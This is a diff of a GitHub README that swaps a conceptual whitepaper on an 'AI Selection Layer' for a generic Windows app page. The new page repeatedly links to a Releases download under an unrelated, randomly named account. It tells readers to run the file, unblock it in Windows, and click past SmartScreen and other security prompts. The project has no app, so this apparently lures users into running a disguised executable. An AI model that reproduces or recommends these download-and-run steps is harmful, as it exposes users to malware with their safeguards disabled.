@@ -1,250 +1,166 @@
-# The Selection Layer
+# 🧩 the-selection-layer - Clear AI visibility decisions
 
-The Selection Layer, as defined by Netsleek, is the decision system through which AI models determine which entities are included, recommended, and represented in generated responses.
+[![Download the-selection-layer](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Foullineceleryseed314/the-selection-layer/releases)
 
-> Foundational model by Netsleek — defining how AI systems determine visibility through selection, not ranking.
+## 📥 Download
 
-Technical whitepaper on AI decision systems and visibility.
+Visit this page to download: https://github.com/Foullineceleryseed314/the-selection-layer/releases
 
-> *Netsleek Research · March 2026*
+1. Open the link in your web browser.
+2. Find the latest release near the top of the page.
+3. Download the Windows file listed under Assets.
+4. If your browser asks what to do with the file, choose Save.
+5. When the download ends, open the file to start the app.
 
-[Download PDF version](./selection-layer-whitepaper.pdf) · [Read full paper](https://www.netsleek.com/netsleek-research/the-selection-layer/) · [Glossary definition](https://www.netsleek.com/glossary/selection-layer/)
+## 🖥️ What this app does
 
----
+the-selection-layer helps show how AI systems decide what to include, hide, or rank. It acts as a selection layer, which is the part of an AI system that makes visibility and recommendation choices.
 
-## Abstract
+Use it to:
 
-The Selection Layer represents the system-level decision boundary within artificial intelligence systems where candidate information, entities, and signals are evaluated and final inclusion is determined. As AI-driven interfaces replace traditional search results, visibility is no longer governed by ranking position, but by whether an entity is selected for inclusion within generated responses.
+- Review how items move through a decision flow
+- See why one result gets shown before another
+- Track selection rules in a simple view
+- Work with search, ranking, and knowledge-based results
+- Test how AI output changes based on input rules
 
-This paper defines the Selection Layer as the primary mechanism through which AI systems determine visibility, recommendation, and representation.
+## ⚙️ Before you start
 
-Netsleek developed the Selection Layer framework to formalise this model — providing organisations with a structured basis for understanding and optimising visibility within AI-mediated discovery environments.
+This app runs on Windows. For best results, use:
 
----
+- Windows 10 or Windows 11
+- A modern web browser if the app opens in one
+- At least 4 GB of RAM
+- Enough free disk space for the download and app files
+- A screen resolution of 1366 × 768 or higher
 
-## Table of Contents
+If your Windows account does not let you save files in some folders, use the Downloads folder.
 
-1. [The Shift from Ranking to Selection](#1-the-shift-from-ranking-to-selection)
-2. [AI System Pipeline Overview](#2-ai-system-pipeline-overview)
-3. [The Selection Layer](#3-the-selection-layer)
-4. [System Model of the Selection Layer](#4-system-model-of-the-selection-layer)
-5. [Selection vs Ranking](#5-selection-vs-ranking)
-6. [System-Level Resolution](#6-system-level-resolution)
-7. [Implications for Visibility](#7-implications-for-visibility)
-8. [Implications for Systems and Strategy](#8-implications-for-systems-and-strategy)
-9. [Conclusion](#9-conclusion)
+## 🚀 Install and run
 
----
+1. Download the app from the Releases page.
+2. Open File Explorer and go to your Downloads folder.
+3. Find the file you just downloaded.
+4. If the file is a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows shows a security prompt, choose the option that lets you run the file.
+8. Wait for the app window to open.
 
-## 1. The Shift from Ranking to Selection
+If the app uses a setup file, follow the on-screen steps and keep the default options unless you have a reason to change them.
 
-Traditional search systems operate on ranking models. Visibility is determined by position within a list of results.
+## 🧭 First-time setup
 
-AI systems operate differently.
+When you open the app for the first time, it may ask you to set a few basic options:
 
-Instead of presenting ranked lists, they generate responses. This requires a decision about what information to include — not just how to order it.
+- Choose your preferred language
+- Pick a display size
+- Set a default search or selection mode
+- Allow the app to save local settings
 
-**Selection replaces ranking as the governing mechanism of visibility.**
+If the app opens to a blank screen, wait a few seconds and refresh the window if needed.
 
-Visibility is therefore determined by inclusion, not position.
+## 🔍 How to use it
 
----
+Use the app by moving through the selection flow:
 
-## 2. AI System Pipeline Overview
+1. Add or load an item set.
+2. Review the decision layer rules.
+3. Check which items are visible.
+4. Compare included and excluded results.
+5. Adjust settings and see how the output changes.
 
-AI systems process information through multiple stages:
+The selection layer helps you understand the path from raw input to final output. It is useful when you want to see why an AI system chose one result instead of another.
 
-```
-Semantic Interpretation
-        ↓
-Entity Understanding
-        ↓
-Trust Evaluation
-        ↓
-Signal Weighting
-        ↓
-Contextual Alignment
-        ↓
-   Selection Layer        ← decision boundary
-        ↓
-  Output Generation
-```
+## 🧠 Key features
 
-Each stage contributes signals and structure that inform the final decision. The Selection Layer sits at the point where these inputs are resolved into an outcome.
+- Clear view of selection decisions
+- Support for AI search and ranking work
+- Simple handling of visibility rules
+- Fast review of included and excluded items
+- Useful for semantic search flows
+- Works with knowledge graph style data
+- Helps test large language model outputs
+- Built for decision system review
 
----
+## 🧰 Typical use cases
 
-## 3. The Selection Layer
+- Checking why one answer appears in a result list
+- Comparing search outputs across different rules
+- Studying how AI systems filter content
+- Reviewing recommendation logic
+- Testing visibility rules before wider use
+- Mapping how items move through a selection process
 
-**Definition:**  
-The Selection Layer is the system-level decision boundary where AI systems determine what information is included, excluded, or recommended in generated outputs.
+## 📂 File tips
 
-The Selection Layer is the convergence point where semantic interpretation, entity understanding, trust evaluation, signal weighting, and contextual relevance are synthesised into a single decision.
+After you download the app, keep these tips in mind:
 
-It is not a single algorithm or component. It is a system-level boundary.
+- Do not move the app files while it is open
+- Keep the extracted folder together
+- If the app depends on support files, leave them in the same folder
+- Rename files only if you know the app will still find them
 
-At this boundary, AI systems determine:
+## 🔐 Windows tips
 
-- what is **included**
-- what is **excluded**
-- what is **recommended**
-- what is **cited**
-- what remains **invisible**
+If Windows blocks the file:
 
-The Selection Layer replaces traditional ranking as the primary mechanism through which AI systems determine visibility and inclusion.
+1. Right-click the file.
+2. Select Properties.
+3. Look for an Unblock option near the bottom.
+4. Check it if it appears.
+5. Click Apply and then run the file again.
 
----
+If Windows SmartScreen opens, choose More info if needed, then select the option to run the app.
 
-## 4. System Model of the Selection Layer
+## 🛠️ Troubleshooting
 
-### Inputs
+### The file will not open
 
-| Signal | Description |
-|---|---|
-| Semantic meaning | Interpretation of language and context |
-| Entity relationships | Knowledge graph structure |
-| Trust signals | Credibility, authority, corroboration |
-| Signal weighting | Importance and prioritisation |
-| Contextual alignment | User intent and situation |
+- Make sure the download finished
+- Check that you opened the right file
+- If the file is inside a ZIP folder, extract it first
+- Try running it again as a standard user
 
-### Processing
+### The app opens and closes right away
 
-| Stage | Function |
-|---|---|
-| Candidate evaluation | Assessing eligible sources |
-| Confidence scoring | Quantifying signal strength |
-| Decision thresholds | Determining inclusion cutoffs |
-| Conflict resolution | Handling competing signals |
-| Uncertainty handling | Managing incomplete or ambiguous data |
+- Make sure all files stayed in the same folder
+- Re-download the file in case it got damaged
+- Check that Windows did not remove any files
 
-### Outputs
+### The download page does not show a file
 
-| Output type | Meaning |
-|---|---|
-| Inclusion | Entity appears in response |
-| Exclusion | Entity is omitted |
-| Recommendation | Entity is actively suggested |
-| Citation | Entity is referenced as a source |
+- Refresh the Releases page
+- Look for the latest release at the top
+- Check the Assets section under the release
 
----
+### The app looks too small
 
-## 5. Selection vs Ranking
+- Change your screen scale settings in Windows
+- Increase text size in the app if that option exists
+- Use a higher screen resolution if possible
 
-| Ranking Systems | Selection Layer |
-|---|---|
-| Order results | Decide inclusion |
-| Position determines visibility | Inclusion determines visibility |
-| List-based output | Generated response |
-| Relevance-driven | Multi-signal decision |
-| Search engine model | AI system model |
+## 🧩 Repository topics
 
-The Selection Layer fundamentally changes how visibility is determined.
+This project relates to:
 
----
+- AI architecture
+- AI search
+- AI visibility
+- Decision systems
+- Generative AI
+- Information retrieval
+- Knowledge graphs
+- Large language models
+- Semantic search
+- Selection layers
 
-## 6. System-Level Resolution
+## 📝 What to expect
 
-The Selection Layer resolves outputs from multiple upstream systems into a single decision.
+This project focuses on the decision stage inside an AI system. That stage controls what users see and what gets left out. It matters in search, recommendations, and answer generation.
 
-- Semantic systems provide **meaning**
-- Entity systems define **relationships**
-- Trust systems evaluate **credibility**
-- Signal systems determine **weighting**
-- Context systems align **intent**
+If you use AI tools that rank results or choose from many items, this layer helps explain the result path in plain terms
 
-These systems do not operate independently at the point of output. They are integrated and resolved within the Selection Layer.
+## 📁 Download link
 
----
-
-## 7. Implications for Visibility
-
-Visibility in AI systems depends on selection eligibility.
-
-Entities must:
-
-- be clearly defined
-- be contextually relevant
-- be supported by credible signals
-- align with user intent
-- meet confidence thresholds
-
-Retrieval alone is insufficient. **Selection replaces ranking as the governing mechanism of visibility.**
-
----
-
-## 8. Implications for Systems and Strategy
-
-Systems designed for ranking optimisation do not fully account for AI-driven environments.
-
-Optimisation must shift toward:
-
-- entity clarity
-- signal strength
-- trust reinforcement
-- contextual alignment
-- inclusion eligibility
-
-**The Selection Layer becomes the central point of optimisation.**
-
----
-
-## 9. Conclusion
-
-The Selection Layer defines the decision boundary within AI systems where visibility is determined. It represents a structural shift from ranking-based models to inclusion-based decision systems.
-
-As AI systems continue to evolve, the Selection Layer becomes the dominant framework governing visibility, recommendation, and representation across search, assistants, and generative platforms.
-
----
-
-## Selection Layer Conceptual Model
-
-```
-Semantic Systems  ─┐
-Entity Systems    ─┤
-Trust Systems     ─┼──→  [ Selection Layer ]  ──→  Output
-Signal Systems    ─┤
-Context Systems   ─┘
-```
-
----
-
-## Research Authors
-
-**Ruan Masuret** and **Juanita Martinaglia** are the founders of Netsleek, an AI Search and Brand Discoverability practice that studies how artificial intelligence systems interpret, evaluate, and select information sources within modern discovery environments.
-
-| | |
-|---|---|
-| **Organisation** | Netsleek |
-| **Website** | [netsleek.com](https://www.netsleek.com) |
-| **Published** | March 2026 |
-| **Document type** | White Paper |
-| **Contact** | info@netsleek.com |
-
----
-
-## Cite This Paper
-
-```
-Masuret, R. & Martinaglia, J. (2026). The Selection Layer: How Artificial Intelligence
-Determines Which Brands Become Visible. Netsleek Research.
-https://www.netsleek.com/netsleek-research/the-selection-layer/
-```
-
----
-
-## Reference
-
-Full conceptual definition and extended framework:
-[netsleek.com/glossary/selection-layer/](https://www.netsleek.com/glossary/selection-layer/)
-
----
-
-## Licence
-
-© 2026 Netsleek. All rights reserved.
-
-This paper is published for research and educational purposes. Please cite appropriately when referencing this work.
-
----
-
-*Netsleek Research · [netsleek.com](https://www.netsleek.com) · info@netsleek.com*
+https://github.com/Foullineceleryseed314/the-selection-layer/releases
